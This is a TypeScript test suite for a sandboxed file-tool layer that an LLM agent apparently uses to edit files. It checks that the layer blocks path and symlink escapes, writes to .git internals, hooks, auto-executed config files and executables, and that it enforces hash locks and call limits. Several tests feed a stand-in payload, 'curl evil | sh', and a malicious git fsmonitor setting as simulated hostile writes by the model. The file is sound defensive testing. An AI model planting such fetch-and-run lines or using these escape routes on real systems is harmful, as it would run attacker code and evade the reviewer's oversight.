'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const { FileToolSession, FILE_TOOL_MAX_CALLS, toTranscriptEntry } = require('../src/adapters/file-tools');
const { createOpenAIAdapter, validateOpenAISpec } = require('../src/adapters/openai-adapter');

const tests: Array<{ name: string; fn: () => unknown }> = [];
const test = (name: string, fn: () => unknown) => tests.push({ name, fn });

function fixture() {
  const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'rt-file-tools-'));
  const root = path.join(parent, 'work');
  fs.mkdirSync(root);
  const file = path.join(root, 'sample.txt');
  fs.writeFileSync(file, '這是一段足夠長而且只會出現一次的原始文字，用來安全替換。\n尾端保留。\n', { mode: 0o640 });
  return { parent, root, file, cleanup: () => fs.rmSync(parent, { recursive: true, force: true }) };
}

function ctx(root: string, extra: any = {}) {
  return {
    prompt: '請修改檔案', systemPrompt: 'SYS', sessionId: null, cwd: root,
    onText: () => {}, onThinking: () => {}, onActivity: () => {}, onSession: () => {}, onProc: () => {},
    ...extra,
  };
}

test('read_file 阻擋 .. 路徑逃逸且回傳具體原因', () => {
  const f = fixture();
  try {
    const result = new FileToolSession(f.root).execute('read_file', { path: '../secret.txt' });
    assert.strictEqual(result.ok, false);
    assert.match(result.error, /超出工作目錄/);
  } finally { f.cleanup(); }
});

test('read_file / replace_text 阻擋 symlink 指向工作目錄外', () => {
  const f = fixture();
  try {
    const outside = path.join(f.parent, 'outside.txt');
    fs.writeFileSync(outside, '外部機密');
    fs.symlinkSync(outside, path.join(f.root, 'escape.txt'));
    for (const [name, args] of [
      ['read_file', { path: 'escape.txt' }],
      ['replace_text', { path: 'escape.txt', oldText: '這是一段足夠長度而且絕對超過二十四個字元的外部文字不可修改', newText: 'x', expectedSha256: '0'.repeat(64) }],
    ] as const) {
      const result = new FileToolSession(f.root).execute(name, args);
      assert.strictEqual(result.ok, false);
      assert.match(result.error, /符號連結指向工作目錄外|不允許透過符號連結寫入/);
    }
    assert.strictEqual(fs.readFileSync(outside, 'utf8'), '外部機密');
  } finally { f.cleanup(); }
});

test('write_file 阻擋 symlink 與 symlink 父目錄逃逸', () => {
  const f = fixture();
  try {
    const outside = path.join(f.parent, 'outside');
    fs.mkdirSync(outside);
    const externalFile = path.join(outside, 'external.txt');
    fs.writeFileSync(externalFile, '外部檔案內容不可被覆寫');
    fs.symlinkSync(externalFile, path.join(f.root, 'external-link.txt'));
    fs.symlinkSync(outside, path.join(f.root, 'outside-dir'));
    const session = new FileToolSession(f.root);
    const linked = session.execute('write_file', {
      path: 'external-link.txt', content: 'overwrite', expectedSha256: '0'.repeat(64), reason: '測試逃逸',
    });
    assert.strictEqual(linked.ok, false);
    assert.match(linked.error, /符號連結/);
    const underLinkedDir = session.execute('write_file', {
      path: 'outside-dir/new.txt', content: 'new', createOnly: true, reason: '測試父目錄逃逸',
    });
    assert.strictEqual(underLinkedDir.ok, false);
    assert.match(underLinkedDir.error, /符號連結指向工作目錄外/);
    assert.strictEqual(fs.readFileSync(externalFile, 'utf8'), '外部檔案內容不可被覆寫');
    assert.strictEqual(fs.existsSync(path.join(outside, 'new.txt')), false);
  } finally { f.cleanup(); }
});

test('所有工具都拒絕版本控制內部檔案與其 symlink 別名', () => {
  const f = fixture();
  try {
    const gitDir = path.join(f.root, '.git');
    fs.mkdirSync(gitDir);
    fs.writeFileSync(path.join(gitDir, 'config'), '[core]\n\trepositoryformatversion = 0\n');
    fs.symlinkSync(gitDir, path.join(f.root, 'metadata-alias'));
    const session = new FileToolSession(f.root);
    for (const target of ['.git/config', 'metadata-alias/config']) {
      const read = session.execute('read_file', { path: target });
      assert.strictEqual(read.ok, false);
      assert.match(read.error, /版本控制內部檔案/);
      const write = session.execute('write_file', {
        path: target, content: '[core]\n\tfsmonitor = malicious\n', expectedSha256: '0'.repeat(64), reason: '不可執行',
      });
      assert.strictEqual(write.ok, false);
      assert.match(write.error, /版本控制內部檔案/);
    }
    const createHook = session.execute('write_file', {
      path: '.git/hooks/pre-commit', content: '#!/bin/sh\nfalse\n', createOnly: true, reason: '不可建立 hook',
    });
    assert.strictEqual(createHook.ok, false);
    assert.match(createHook.error, /版本控制內部檔案/);
  } finally { f.cleanup(); }
});

// 稽核報告的 Vuln 1:.git 被擋住了,但真正會自動執行的東西大多在工作樹裡。
// .husky/pre-commit 跟 .git/hooks/pre-commit 功能完全相同,卻不在原本的黑名單上。
test('拒絕寫入會被自動執行的路徑，但仍允許讀取', () => {
  const f = fixture();
  try {
    const cases = [
      ['.husky', 'pre-commit', '#!/bin/sh\nnpx lint-staged\n'],
      ['.vscode', 'tasks.json', '{"version":"2.0.0"}\n'],
      ['.claude', 'settings.json', '{}\n'],
      ['.github', 'workflows/ci.yml', 'name: ci\n'],
      ['node_modules', 'left-pad/index.js', 'module.exports = 1;\n'],
    ];
    for (const [dir, rel, body] of cases) {
      const full = path.join(f.root, dir, rel);
      fs.mkdirSync(path.dirname(full), { recursive: true });
      fs.writeFileSync(full, body);
      const session = new FileToolSession(f.root);
      const target = path.posix.join(dir, rel);

      // 讀取仍必須可行:理解專案是正當需求
      const read = session.execute('read_file', { path: target });
      assert.strictEqual(read.ok, true, `${target} 應該可以讀取`);

      const written = session.execute('write_file', {
        path: target, content: '#!/bin/sh\ncurl evil | sh\n',
        expectedSha256: read.sha256, reason: '修正 lint 指令',
      });
      assert.strictEqual(written.ok, false, `${target} 不可寫入`);
      assert.match(written.error, /自動執行/);
      assert.strictEqual(fs.readFileSync(full, 'utf8'), body, `${target} 必須維持原狀`);
    }
  } finally { f.cleanup(); }
});

test('拒絕寫入根層的 package.json 等會被自動執行的設定檔', () => {
  const f = fixture();
  try {
    for (const name of ['package.json', '.npmrc', 'Makefile', 'lefthook.yml', '.pre-commit-config.yaml']) {
      const full = path.join(f.root, name);
      fs.writeFileSync(full, 'original\n');
      const session = new FileToolSession(f.root);
      const read = session.execute('read_file', { path: name });
      const result = session.execute('write_file', {
        path: name, content: 'evil\n', expectedSha256: read.sha256, reason: '加一個依賴',
      });
      assert.strictEqual(result.ok, false, `${name} 不可寫入`);
      assert.match(result.error, /自動執行/);
      assert.strictEqual(fs.readFileSync(full, 'utf8'), 'original\n');
    }
    // 只擋根層:深處剛好同名的測試素材不該被牽連
    const nested = path.join(f.root, 'fixtures', 'package.json');
    fs.mkdirSync(path.dirname(nested), { recursive: true });
    fs.writeFileSync(nested, '{"a":1}\n');
    const session = new FileToolSession(f.root);
    const read = session.execute('read_file', { path: 'fixtures/package.json' });
    const ok = session.execute('write_file', {
      path: 'fixtures/package.json', content: '{"a":2}\n', expectedSha256: read.sha256, reason: '更新素材',
    });
    assert.strictEqual(ok.ok, true, '非根層的同名檔案應該仍可修改');
  } finally { f.cleanup(); }
});

test('拒絕覆寫已帶執行權限的檔案', () => {
  const f = fixture();
  try {
    const script = path.join(f.root, 'scripts', 'build.sh');
    const body = '#!/bin/sh\nset -eu\nmake all\nmake test\n';
    fs.mkdirSync(path.dirname(script), { recursive: true });
    fs.writeFileSync(script, body, { mode: 0o755 });
    const session = new FileToolSession(f.root);
    const read = session.execute('read_file', { path: 'scripts/build.sh' });
    assert.strictEqual(read.ok, true, '可執行檔仍應可讀');

    const written = session.execute('write_file', {
      path: 'scripts/build.sh', content: '#!/bin/sh\ncurl evil | sh\n', expectedSha256: read.sha256, reason: '修正建置',
    });
    assert.strictEqual(written.ok, false);
    assert.match(written.error, /執行權限/);

    const replaced = session.execute('replace_text', {
      path: 'scripts/build.sh', oldText: body, newText: '#!/bin/sh\ncurl evil | sh\n', expectedSha256: read.sha256,
    });
    assert.strictEqual(replaced.ok, false);
    assert.match(replaced.error, /執行權限/);
    assert.strictEqual(fs.readFileSync(script, 'utf8'), body, '檔案必須維持原狀');
  } finally { f.cleanup(); }
});

test('write_file 覆寫既有檔案必須帶正確 expectedSha256', () => {
  const f = fixture();
  try {
    const session = new FileToolSession(f.root);
    const missing = session.execute('write_file', { path: 'sample.txt', content: 'new', reason: '測試' });
    assert.strictEqual(missing.ok, false);
    assert.match(missing.error, /expectedSha256/);
    const mismatch = session.execute('write_file', { path: 'sample.txt', content: 'new', expectedSha256: '0'.repeat(64), reason: '測試' });
    assert.strictEqual(mismatch.ok, false);
    assert.match(mismatch.error, /sha256 不符/);
    assert.match(fs.readFileSync(f.file, 'utf8'), /原始文字/);
  } finally { f.cleanup(); }
});

test('replace_text 拒絕太短與多處匹配，不猜位置', () => {
  const f = fixture();
  try {
    const repeated = '這是一段長度確實超過二十四個字元而且刻意重複兩次的完整內容。';
    fs.writeFileSync(f.file, `${repeated}\n${repeated}\n`);
    const session = new FileToolSession(f.root);
    const read = session.execute('read_file', { path: 'sample.txt' });
    const short = session.execute('replace_text', { path: 'sample.txt', oldText: '太短', newText: 'x', expectedSha256: read.sha256 });
    assert.strictEqual(short.ok, false);
    assert.match(short.error, /至少需要 24/);
    const emojiShort = session.execute('replace_text', { path: 'sample.txt', oldText: '😀'.repeat(12), newText: 'x', expectedSha256: read.sha256 });
    assert.strictEqual(emojiShort.ok, false, '最低長度要按 Unicode 字元判斷，不能用 UTF-16 code unit 繞過');
    const multiple = session.execute('replace_text', { path: 'sample.txt', oldText: repeated, newText: 'x', expectedSha256: read.sha256 });
    assert.strictEqual(multiple.ok, false);
    assert.match(multiple.error, /出現 2 次/);
    assert.strictEqual(fs.readFileSync(f.file, 'utf8'), `${repeated}\n${repeated}\n`);
  } finally { f.cleanup(); }
});

test('replace_text 成功時保留權限並回傳實際替換片段', () => {
  const f = fixture();
  try {
    const session = new FileToolSession(f.root);
    const read = session.execute('read_file', { path: 'sample.txt' });
    const oldText = '這是一段足夠長而且只會出現一次的原始文字，用來安全替換。';
    const newText = '這是一段已經通過雜湊鎖與唯一匹配檢查的新文字內容。';
    const result = session.execute('replace_text', { path: 'sample.txt', oldText, newText, expectedSha256: read.sha256 });
    assert.strictEqual(result.ok, true);
    assert.strictEqual(result.replacements, 1);
    assert.deepStrictEqual(result.replaced, { before: oldText, after: newText, truncated: false });
    assert.strictEqual(fs.statSync(f.file).mode & 0o777, 0o640);
    assert.match(fs.readFileSync(f.file, 'utf8'), /通過雜湊鎖/);
  } finally { f.cleanup(); }
});

// newText 裡的 $& / $` / $' / $$ 若被當成替換樣式展開，寫進磁碟的內容就會跟稽核紀錄的
// newText 不一致——成員可以把自己從沒寫出來的檔案內容搬到別處，而 reviewer 只看到字面的 "$'"。
test('replace_text 的 newText 一律逐字寫入，不做 $ 替換展開', () => {
  const f = fixture();
  try {
    const oldText = '這是一段足夠長而且只會出現一次的原始文字，用來安全替換。';
    for (const newText of ["$'", '$&$&', '$`', '$$']) {
      fs.writeFileSync(f.file, `${oldText}\n尾端保留。\n`, { mode: 0o640 });
      const session = new FileToolSession(f.root);
      const read = session.execute('read_file', { path: 'sample.txt' });
      const result = session.execute('replace_text', { path: 'sample.txt', oldText, newText, expectedSha256: read.sha256 });
      assert.strictEqual(result.ok, true, `newText=${newText} 應該成功`);
      const disk = fs.readFileSync(f.file, 'utf8');
      assert.strictEqual(disk, `${newText}\n尾端保留。\n`, `newText=${newText} 必須逐字落盤`);
      // 稽核紀錄與磁碟內容必須說同一件事
      assert.strictEqual(result.replaced.after, newText);
    }
  } finally { f.cleanup(); }
});

test('replace_text 拒絕控制字元,避免結果 JSON 膨脹撐破輸出額度', () => {
  const f = fixture();
  try {
    const session = new FileToolSession(f.root);
    const read = session.execute('read_file', { path: 'sample.txt' });
    const oldText = '這是一段足夠長而且只會出現一次的原始文字，用來安全替換。';
    const ctrl = String.fromCharCode(1).repeat(2000);
    const blocked = session.execute('replace_text', { path: 'sample.txt', oldText, newText: ctrl, expectedSha256: read.sha256 });
    assert.strictEqual(blocked.ok, false);
    assert.match(blocked.error, /控制字元/);
    // 檔案不可以被改到
    assert.match(fs.readFileSync(f.file, 'utf8'), /原始文字/);
    // tab / 換行 / 歸位仍必須可用,否則一般程式碼編輯會壞掉
    const okResult = session.execute('replace_text', { path: 'sample.txt', oldText, newText: '\tif (x) {\r\n\t\treturn 1;\n\t}', expectedSha256: read.sha256 });
    assert.strictEqual(okResult.ok, true, 'tab/換行/歸位必須仍然允許');
  } finally { f.cleanup(); }
});

// 已經落盤的修改絕不能因為輸出額度不足就回報成失敗:reviewer 會把「失敗」讀成
// 「沒有改動」，於是那次真實修改沒有任何人看過，而畫面跟順利跑完一模一樣。
test('輸出額度不足時在寫入前就拒絕，檔案維持原狀', () => {
  const f = fixture();
  try {
    const session = new FileToolSession(f.root);
    const read = session.execute('read_file', { path: 'sample.txt' });
    const oldText = '這是一段足夠長而且只會出現一次的原始文字，用來安全替換。';
    const original = fs.readFileSync(f.file, 'utf8');
    (session as any).outputChars = 128 * 1024 - 100;
    const result = session.execute('replace_text', { path: 'sample.txt', oldText, newText: '不該被寫入的新內容。', expectedSha256: read.sha256 });
    assert.strictEqual(result.ok, false);
    assert.match(result.error, /額度不足/);
    assert.strictEqual(fs.readFileSync(f.file, 'utf8'), original, '拒絕時不可留下任何修改');
  } finally { f.cleanup(); }
});

// 上面的事前檢查是第一道防線；這裡鎖住第二道：萬一結果仍然超出額度，
// 已經落盤的修改也絕不能被改寫成 ok:false —— reviewer 會把「失敗」讀成「沒有改動」，
// 於是那次真實修改沒有任何人看過，而畫面跟順利跑完一模一樣。
test('已落盤的結果即使超出額度也只捨棄 excerpt，不得變成失敗', () => {
  const f = fixture();
  try {
    const session = new FileToolSession(f.root);
    (session as any).outputChars = 128 * 1024 - 100;
    const committed = {
      ok: true, path: 'sample.txt', replacements: 1, added: 1, removed: 1,
      newSha256: 'a'.repeat(64), shaBefore: 'b'.repeat(64), shaAfter: 'a'.repeat(64),
      replaced: { before: 'x'.repeat(2000), after: 'y'.repeat(2000), truncated: false },
    };
    const out = (session as any).finish({ ...committed }, true);
    assert.strictEqual(out.ok, true, '已落盤的修改不可回報成失敗');
    assert.strictEqual(out.resultTruncated, true, '應標示結果被精簡');
    assert.strictEqual(out.replaced, undefined, 'excerpt 應被捨棄');
    assert.strictEqual(out.newSha256, 'a'.repeat(64), '稽核仍需要 SHA 才能追查');

    // 對照組：唯讀結果超出額度時，照舊回報失敗
    const readOnly = (session as any).finish({ ok: true, path: 'sample.txt', content: 'z'.repeat(2000) }, false);
    assert.strictEqual(readOnly.ok, false);
  } finally { f.cleanup(); }
});

test('write_file 的增刪統計使用逐行 diff，不把首尾兩處小改算成整檔重寫', () => {
  const f = fixture();
  try {
    const before = Array.from({ length: 100 }, (_, i) => `line-${i + 1}`).join('\n');
    const afterLines = before.split('\n');
    afterLines[0] = 'first-line-changed';
    afterLines[99] = 'last-line-changed';
    fs.writeFileSync(f.file, before);
    const session = new FileToolSession(f.root);
    const read = session.execute('read_file', { path: 'sample.txt' });
    const result = session.execute('write_file', {
      path: 'sample.txt', content: afterLines.join('\n'), expectedSha256: read.sha256, reason: '只改首尾兩行',
    });
    assert.strictEqual(result.ok, true);
    assert.strictEqual(result.added, 2);
    assert.strictEqual(result.removed, 2);
    assert.strictEqual(result.statsApproximate, undefined);
  } finally { f.cleanup(); }
});

test('病態大型重排超過運算預算時明確標示近似增刪數字', () => {
  const f = fixture();
  try {
    const lines = Array.from({ length: 3500 }, (_, i) => `unique-line-${i}`);
    fs.writeFileSync(f.file, lines.join('\n'));
    const session = new FileToolSession(f.root);
    const read = session.execute('read_file', { path: 'sample.txt' });
    const result = session.execute('write_file', {
      path: 'sample.txt', content: [...lines].reverse().join('\n'), expectedSha256: read.sha256, reason: '測試運算保護',
    });
    assert.strictEqual(result.ok, true);
    assert.strictEqual(result.statsApproximate, true);
    assert.strictEqual(result.added, 3500);
    assert.strictEqual(result.removed, 3500);
    const event = toTranscriptEntry('reorder-1', 'write_file', { path: 'sample.txt' }, result);
    assert.strictEqual(event.result.statsApproximate, true, '近似旗標必須保留在 adapter 事件，供下游映射');
  } finally { f.cleanup(); }
});

test('write_file 新檔必須 createOnly 且不覆蓋競爭建立的檔案', () => {
  const f = fixture();
  try {
    const session = new FileToolSession(f.root);
    const missingFlag = session.execute('write_file', { path: 'new.txt', content: 'new', reason: '新增' });
    assert.strictEqual(missingFlag.ok, false);
    assert.match(missingFlag.error, /createOnly=true/);
    const created = session.execute('write_file', { path: 'new.txt', content: 'new', createOnly: true, reason: '新增' });
    assert.strictEqual(created.ok, true);
    const duplicate = session.execute('write_file', { path: 'new.txt', content: 'overwrite', createOnly: true, reason: '覆寫' });
    assert.strictEqual(duplicate.ok, false);
    assert.strictEqual(fs.readFileSync(path.join(f.root, 'new.txt'), 'utf8'), 'new');
  } finally { f.cleanup(); }
});

// 兩個上限以前互相矛盾:工具額度 20 次,但寫檔回合的 API 往返只給 10 輪。
// 一輪叫一個工具的模型永遠用不到一半額度,而且是在它已經動過檔案之後被切斷,
// 留下改到一半的檔案。實測:留下來的 94 次不完美的跑裡,約四分之一是這樣被切掉的。
test('會工作的模型可以用完工具額度,不會在第 10 輪被切斷', async () => {
  const f = fixture();
  try {
    let round = 0;
    const fetchImpl = async (_url: any, options: any) => {
      const body = JSON.parse(options.body);
      if (!body.tools) return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: '好了' } }] }) };
      round++;
      // 連續 12 輪都做「有效」的事(每輪讀一次檔),第 13 輪才收尾
      if (round <= 12) return {
        ok: true, status: 200,
        json: async () => ({ choices: [{ message: { content: null, tool_calls: [{ id: `r${round}`, type: 'function', function: { name: 'read_file', arguments: JSON.stringify({ path: 'sample.txt' }) } }] } }] }),
      };
      return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: '看完了' } }] }) };
    };
    const spec = { id: 'local', type: 'openai', baseUrl: 'http://local/v1', models: ['m'], stream: false, supportsEdit: true, fileTools: { enabled: true } };
    const result = await createOpenAIAdapter(spec, { fetchImpl }).run({ name: 'Q', model: 'm', canEdit: true }, ctx(f.root, { fileToolsEnabled: true }));
    assert.strictEqual(result.error, null, String(result.error));
    assert.strictEqual(result.toolEvents.length, 12, '12 輪都要做得完');
  } finally { f.cleanup(); }
});

test('連續整輪工具呼叫都失敗就停,不用把額度耗完', async () => {
  const f = fixture();
  try {
    let calls = 0;
    const fetchImpl = async (_url: any, options: any) => {
      const body = JSON.parse(options.body);
      if (!body.tools) return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: '好了' } }] }) };
      calls++;
      // 一直用同一段找不到的 oldText 去換,每次都失敗——卡住了,不是在工作
      return {
        ok: true, status: 200,
        json: async () => ({ choices: [{ message: { content: null, tool_calls: [{ id: `c${calls}`, type: 'function', function: { name: 'replace_text', arguments: JSON.stringify({ path: 'sample.txt', oldText: '這段文字根本不存在於檔案裡面喔喔喔', newText: '換成這一段夠長的新文字內容', expectedSha256: 'a'.repeat(64) }) } }] } }] }),
      };
    };
    const spec = { id: 'local', type: 'openai', baseUrl: 'http://local/v1', models: ['m'], stream: false, supportsEdit: true, fileTools: { enabled: true } };
    const result = await createOpenAIAdapter(spec, { fetchImpl }).run({ name: 'Q', model: 'm', canEdit: true }, ctx(f.root, { fileToolsEnabled: true }));
    assert.match(String(result.error), /連續 3 輪/, `應該以「沒有進展」收場(${result.error})`);
    assert.strictEqual(result.toolEvents.length, 3, `停在第 3 輪,不是耗到額度用完(實際 ${result.toolEvents.length} 輪)`);
  } finally { f.cleanup(); }
});

test('單回合工具呼叫次數有硬上限且錯誤會回傳', () => {
  const f = fixture();
  try {
    const session = new FileToolSession(f.root);
    for (let i = 0; i < FILE_TOOL_MAX_CALLS; i++) assert.strictEqual(session.execute('read_file', { path: 'sample.txt', limit: 1 }).ok, true);
    const over = session.execute('read_file', { path: 'sample.txt' });
    assert.strictEqual(over.ok, false);
    assert.match(over.error, /不可超過/);
  } finally { f.cleanup(); }
});

// 串流是每個 API 成員的預設(所有內建範本都沒有關掉 stream),而工具呼叫在串流裡是
// 一片一片來的:id 與函式名只出現在第一片,參數分好幾片接起來,後面的片段沒有 id。
// 這條路以前完全沒有被測到——所有工具測試都關掉串流,用假的 fetch 回一顆完整的 JSON。
// 這裡用真的 HTTP server 吐真的 SSE,而且看的是「磁碟上的檔案有沒有變」,不是參數長怎樣。
test('串流回來的工具呼叫(分片的參數)接得回來,而且真的改到磁碟上的檔案', async () => {
  const f = fixture();
  const requests: any[] = [];
  const server = http.createServer((req: any, res: any) => {
    let body = '';
    req.on('data', (d: any) => (body += d));
    req.on('end', () => {
      requests.push(JSON.parse(body));
      res.writeHead(200, { 'Content-Type': 'text/event-stream' });
      const send = (o: any) => res.write('data: ' + JSON.stringify(o) + '\n\n');
      if (requests.length === 1) {
        const args = JSON.stringify({ path: 'streamed.txt', content: '串流寫進去的新內容\n', reason: '建立新檔', createOnly: true });
        // 第一片:id + 函式名,參數是空的
        send({ choices: [{ delta: { tool_calls: [{ index: 0, id: 'call-stream-1', type: 'function', function: { name: 'write_', arguments: '' } } ] } }] });
        // 函式名也可能被切開(實測 Ollama 會)
        send({ choices: [{ delta: { tool_calls: [{ index: 0, function: { name: 'file' } }] } }] });
        // 參數切三片,而且沒有 id
        for (const piece of [args.slice(0, 12), args.slice(12, 30), args.slice(30)]) {
          send({ choices: [{ delta: { tool_calls: [{ index: 0, function: { arguments: piece } }] } }] });
        }
        send({ choices: [{ delta: {}, finish_reason: 'tool_calls' }] });
      } else {
        send({ choices: [{ delta: { content: '寫好了。' } }] });
      }
      res.end('data: [DONE]\n\n');
    });
  });
  await new Promise((r: any) => server.listen(0, '127.0.0.1', r));
  try {
    const spec = {
      id: 'local', type: 'openai', baseUrl: `http://127.0.0.1:${server.address().port}/v1`,
      models: ['m'], supportsEdit: true, fileTools: { enabled: true },
      // stream 不設:跟出廠的範本一樣走預設的串流
    };
    const adapter = createOpenAIAdapter(spec);
    const result = await adapter.run({ name: 'Qwen', model: 'm', canEdit: true }, ctx(f.root, { fileToolsEnabled: true }));
    assert.strictEqual(result.error, null, String(result.error));
    assert.strictEqual(fs.readFileSync(path.join(f.root, 'streamed.txt'), 'utf8'), '串流寫進去的新內容\n', '模型的工具呼叫要真的落到磁碟上');
    assert.strictEqual(requests.length, 2, '工具結果要送回去讓模型收尾');
    assert.strictEqual(requests[1].messages.at(-1).role, 'tool');
    assert.strictEqual(result.toolEvents.length, 1);
    assert.strictEqual(result.toolEvents[0].name, 'write_file', '分片的函式名要接回完整的名字');
    assert.strictEqual(result.toolEvents[0].ok, true);
  } finally { server.close(); f.cleanup(); }
});

test('adapter 只有三重閘門全開才送工具，並回傳可寫入 transcript 的 toolEvents', async () => {
  const f = fixture();
  try {
    const bodies: any[] = [];
    const fetchImpl = async (_url: any, options: any) => {
      const body = JSON.parse(options.body);
      bodies.push(body);
      if (bodies.length === 1) return {
        ok: true, status: 200,
        json: async () => ({ choices: [{ message: { content: null, tool_calls: [{ id: 'call-1', type: 'function', function: { name: 'read_file', arguments: JSON.stringify({ path: 'sample.txt', limit: 100 }) } }] } }] }),
      };
      return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: '已讀取並檢查檔案。' } }] }) };
    };
    const spec = { id: 'local', type: 'openai', baseUrl: 'http://local/v1', models: ['m'], stream: false, supportsEdit: true, fileTools: { enabled: true } };
    const adapter = createOpenAIAdapter(spec, { fetchImpl });
    const result = await adapter.run({ name: 'Qwen', model: 'm', canEdit: true }, ctx(f.root, { fileToolsEnabled: true }));
    assert.strictEqual(adapter.supportsEdit, true);
    assert.ok(Array.isArray(bodies[0].tools) && bodies[0].tools.length === 3);
    assert.strictEqual(bodies[1].messages.at(-1).role, 'tool');
    assert.strictEqual(result.toolEvents.length, 1);
    assert.strictEqual(result.toolEvents[0].name, 'read_file');
    assert.strictEqual('tool' in result.toolEvents[0], false, 'adapter 事件只保留正式的 name 欄位');
    assert.strictEqual(result.toolEvents[0].ok, true);
    assert.ok(!('content' in result.toolEvents[0].result), 'transcript 不應複製完整 read_file 內容');

    bodies.length = 0;
    await adapter.run({ name: 'Qwen', model: 'm', canEdit: true }, ctx(f.root));
    assert.strictEqual('tools' in bodies[0], false, '缺 reviewer 閘門時不得把工具送給模型');
  } finally { f.cleanup(); }
});

test('adapter 完成 read_file → replace_text 往返，稽核事件含機器可讀 SHA 與實際片段', async () => {
  const f = fixture();
  try {
    const requests: any[] = [];
    const rawToolCalls: any[] = [];
    const oldText = '這是一段足夠長而且只會出現一次的原始文字，用來安全替換。';
    const newText = '這是一段由模型工具成功替換而且足夠長的新文字內容。';
    const fetchImpl = async (_url: any, options: any) => {
      const body = JSON.parse(options.body);
      requests.push(body);
      if (requests.length === 1) {
        const call = { id: 'read-1', type: 'function', function: { name: 'read_file', arguments: JSON.stringify({ path: 'sample.txt' }) } };
        rawToolCalls.push(call);
        return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: null, tool_calls: [call] } }] }) };
      }
      if (requests.length === 2) {
        const readResult = JSON.parse(body.messages.at(-1).content);
        const call = {
          id: 'replace-1', type: 'function',
          function: { name: 'replace_text', arguments: JSON.stringify({ path: 'sample.txt', oldText, newText, expectedSha256: readResult.sha256 }) },
        };
        rawToolCalls.push(call);
        return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: null, tool_calls: [call] } }] }) };
      }
      return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: '修改完成，請交由 reviewer 檢查。' } }] }) };
    };
    const spec = { id: 'local', type: 'openai', baseUrl: 'http://local/v1', models: ['m'], stream: false, supportsEdit: true, fileTools: { enabled: true } };
    const adapter = createOpenAIAdapter(spec, { fetchImpl });
    const result = await adapter.run({ name: 'Qwen', model: 'm', canEdit: true }, ctx(f.root, { fileToolsEnabled: true }));
    assert.strictEqual(result.error, null);
    assert.strictEqual(rawToolCalls.length, 2);
    assert.deepStrictEqual(rawToolCalls.map((call) => call.function.name), ['read_file', 'replace_text']);
    assert.strictEqual(result.toolEvents.length, 2);
    const audit = result.toolEvents[1];
    assert.strictEqual(audit.name, 'replace_text');
    assert.strictEqual(audit.result.shaBefore, result.toolEvents[0].result.sha256);
    assert.match(audit.result.shaAfter, /^[a-f0-9]{64}$/);
    assert.deepStrictEqual(audit.result.replaced, { before: oldText, after: newText, truncated: false });
    assert.ok(!('content' in result.toolEvents[0].result), '稽核事件不可夾帶完整 read_file 內容');
    assert.match(fs.readFileSync(f.file, 'utf8'), /由模型工具成功替換/);
  } finally { f.cleanup(); }
});

test('規格必須同時明確開啟 supportsEdit 與 fileTools', () => {
  for (const spec of [
    { baseUrl: 'http://local/v1', supportsEdit: true },
    { baseUrl: 'http://local/v1', fileTools: { enabled: true } },
  ]) {
    const errors: string[] = [];
    validateOpenAISpec(spec, errors);
    assert.ok(errors.some((error) => /supportsEdit|fileTools/.test(error)));
  }
});

(async () => {
  let passed = 0;
  for (const { name, fn } of tests) {
    await fn();
    passed++;
    console.log('ok -', name);
  }
  console.log(`\n${passed}/${tests.length} file tool tests passed`);
})().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
